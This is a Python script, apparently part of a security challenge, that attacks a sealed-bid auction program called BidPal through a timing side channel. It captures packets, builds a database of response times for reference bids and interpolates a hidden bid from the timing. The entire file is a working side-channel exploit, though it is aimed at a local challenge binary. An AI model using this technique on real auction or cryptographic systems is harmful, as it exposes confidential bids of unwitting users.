from fcntl import fcntl, F_GETFL, F_SETFL
from os import O_NONBLOCK, read
import subprocess
import time
import sys
import numpy
import traceback
import random
import json
import argparse
import packetcollector
import processcommspackets
from interact_bidpal import BidPalUser

bin_dir = "../../../challenge_program/bin"

def median(lst):
    return numpy.median(lst)

class BidPalAttack:
    MAX_BID = 500


    # for num_guesses random bids, try to guess bid amount with num_iterations timings
    # and calculate the percentage in which our guess is within threshold of the right amount
    def make_guesses(self, num_guesses, num_iterations, interface, threshold=30):
        error_tot = 0.0
        worst_err = 0
        success_count = 0.0
        # make a list of random bids to try to guess via timing
        bids_to_guess = []
        for i in range(num_guesses):
            bid_to_guess = random.randint(0, self.MAX_BID)
            bids_to_guess.append(bid_to_guess)
        bid_times = self.collect_times(bids_to_guess, num_iterations, interface)
        # for each bid
        for bid in bid_times:
            times = bid_times[bid]
            # find the closest reference bid time to the median of the times we saw
            guess = int(self.make_guess(times))
            err = abs(guess-bid)
            error_tot += err
            if (err>worst_err):
                worst_err = err
            if (err<=threshold):
                success_count+=1

        print "avg err " + str(error_tot/float(num_guesses))
        print "worst err " + str(worst_err)
        print "probability of success (within $" + str(threshold) + "): " + str(success_count/float(num_guesses))

    def make_guess(self, times):
        ref_bid = self.get_closest(self.ref_times, median(times))
        ref_time = median(self.ref_times[ref_bid])
        t = median(times)
        # interpolate actual bid from reference bids
        if (t>ref_time):
            guess = ref_bid - (t - ref_time)/self.avg_delta
        else:
            guess = ref_bid + (ref_time-t)/self.avg_delta
            # make sure guess is in acceptable range
        if guess<0:
            guess = 0
        if guess>self.MAX_BID:
            guess=self.MAX_BID
        return guess

    def get_closest(self, refs, mine):
        closest = False
        for bid in refs:
            time = median(refs[bid])
            if closest == False:
                closest = time
                closest_bid = bid
            elif abs(closest-mine) > abs(time -mine):
                closest = time
                closest_bid = bid
        return closest_bid

    '''
    record the time it takes a bidder of amount other_bid to respond to a bid commitment
    bidder is some existing bidder, while we create another bidder for the requested bid
    '''
    def time_bid_response(self, seller, bidder, other_bid, auction, port, biddername, interface):
        other_bidder= BidPalUser(bin_dir, port, biddername)
        with packetcollector.PacketCollector(interface, "tcp port {}".format(port)) as packet_collector:
            bidder.connect("127.0.0.1", port)
            seller.connect("127.0.0.1", port)
            # waiting to hear that we've been connected to by the other users
            other_bidder.wait_for_outputs([bidder.get_user_id(), seller.get_user_id()])
            seller.start_auction("awesome watch!", auction)
            time.sleep(1)
            other_bidder.bid(auction, other_bid)
            time.sleep(1) # make sure bidder sees commitment before making his own, so I don't get his comparison before his commit!
            bidder.bid_and_wait_for_response(auction, self.MAX_BID) # don't care what this bid is
            time.sleep(1)
            packet_collector.stop()
            time.sleep(1)
            other_bidder.quit()
            #packet_collector.save("attack_"+str(port)+".pcap")
            times = self.parse_pcap(packet_collector.get_pcap(), "127.0.0.1", port)
            return times[0] # there should be exactly one time in there

    def gather_stats(self, num_ref_bids, num_iterations, interface):
        self.ref_bids = [] # list of representative bids to time
        fract = self.MAX_BID/float(num_ref_bids-1) # gap between consecutive ref_bids
        for i in range(num_ref_bids):
            bid = int(i*fract)
            self.ref_bids.append(bid)
        # time each of the ref_bids num_iterations times
        self.ref_times = self.collect_times(self.ref_bids, num_iterations, interface)
        # compute avg time diff per dollar
        diffs = []
        for i in range(num_ref_bids-1):
            timeiplus1 = median(self.ref_times[self.ref_bids[i+1]])
            timei = median(self.ref_times[self.ref_bids[i]])
            bidplus = self.ref_bids[i+1]
            bidi = self.ref_bids[i]
            delta = (timei - timeiplus1)/float(bidplus - bidi)
            diffs.append(delta)
        self.avg_delta = sum(diffs)/float(len(diffs))
        #print "average difference per dollar " + str(self.avg_delta)

    # for each bid value in bid_values, time bid responses from bidder at that value num_iteration times                 
    def collect_times(self, bid_values, num_iterations, interface):
        count = 1
        init_port =8000
        # we'll keep this bidder around for all the bids we time
        seller = BidPalUser(bin_dir, init_port, "seller")
        init_port+=1
        main_bidder = BidPalUser(bin_dir, init_port, "main_bidder")
        seller.connect("127.0.0.1", str(init_port))
        times = {} # list of times for each bid value

        # record times for various bids
        for bid in bid_values:
            times[bid] = []
            for k in range(num_iterations):
                auction_id = "item"+str(count)
                port = str(init_port+count)
                bidder_id = "bidder" + str(count)
                t = self.time_bid_response(seller, main_bidder, bid, auction_id, port, bidder_id, interface)
                times[bid].append(t)
                count+=1
        main_bidder.quit()
        return times

    # pick out elapsed time from bid commitment received at serverPort to response sent     
    def parse_pcap(self, pcap, serverAddr, serverPort):
        serverPort = int(serverPort)
        times = [] # times from send of bid commitment to receipt of bid comparison msg
        conversations = processcommspackets.get_conversations(pcap, serverAddr, serverPort)

        for id, conversation in conversations.items():
            nonsetupMsgs = conversation.get_messages_without_setup()
            timeInfo = processcommspackets.get_time_deltas_for_messages(nonsetupMsgs)
            deltas = [delta.get_delta() for delta in timeInfo \
                      if delta.is_client_to_server() \
                      and delta.get_start_msg().get_size()<200 \
                      and delta.get_end_msg().get_size() >200]
            times.extend(deltas)

        return times


    def load(self, db_filename):
        with open(db_filename, 'r') as reader:
            tempDict = json.load(reader)
            # Note: json has turned our ints into strings, so we have to convert them back

            self.ref_bids = tempDict["ref_bids"]
            self.avg_delta = float(tempDict["avg_delta"])
            ref_times = tempDict["ref_times"]
            self.ref_times = {}
            for (key, val) in ref_times.iteritems(): # json turned the keys into strings -- fix
                self.ref_times[int(key)] = val
            #print "loaded stats from " + db_filename

    def save(self, db_filename):
        '''
        Saves the database to the file/tmp/tmpnwX6Jx

        '''
        #print "saving stats to " + db_filename
        with open(db_filename, 'w') as writer:
            dic = {"ref_bids" : self.ref_bids,
                   "ref_times" : self.ref_times,
                   "avg_delta" : self.avg_delta}
            #print dic
            json.dump(dic, writer)



if __name__=="__main__":
    attack = BidPalAttack()
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument("interface", help="network interface on which to listen", default="eth0")
        subparsers = parser.add_subparsers(dest="command")
        buildparser = subparsers.add_parser('build', help='Build a new database')
        buildparser.add_argument("ref_bids", help="the number of reference bids to use", default=6)
        buildparser.add_argument("iterations", help="number of times to time each bid", default=10)
        buildparser.add_argument("outfile", help="specify the filename for the database to build")
        experimentparser = subparsers.add_parser('experiment', help='use existing database to determine bid of a user')

        experimentparser.add_argument("iterations", help="number of times to time each bid", default=10)
        experimentparser.add_argument("count", help= "number of experiment bid determinations to perform", default =10)
        experimentparser.add_argument("db", help="stored database")

        attackparser = subparsers.add_parser('attack', help="guess a single bid via timings")
        attackparser.add_argument("bid", help="bid to observe")
        attackparser.add_argument("observations", help="number of allowed observations")
        attackparser.add_argument("db", help="stored timings database")

        args = parser.parse_args()
        if args.command == 'build':
            attack.gather_stats(int(args.ref_bids), int(args.iterations), args.interface)
            attack.save(args.outfile)
        elif args.command == "experiment":
            attack.load(args.db)
            attack.make_guesses(int(args.count), int(args.iterations), args.interface)
        elif args.command == "attack":
            attack.load(args.db)
            bid_to_guess = int(args.bid)
            bid_times = attack.collect_times([bid_to_guess], int(args.observations), args.interface)
            guess = attack.make_guess(bid_times[bid_to_guess])
            if abs(guess-bid_to_guess)<30:
                print "Successfully guessed within 30 of bid"
            else:
                print "Attack failed to guess within 30 of bid"

    except:
        print "error"
        traceback.print_exc()
    
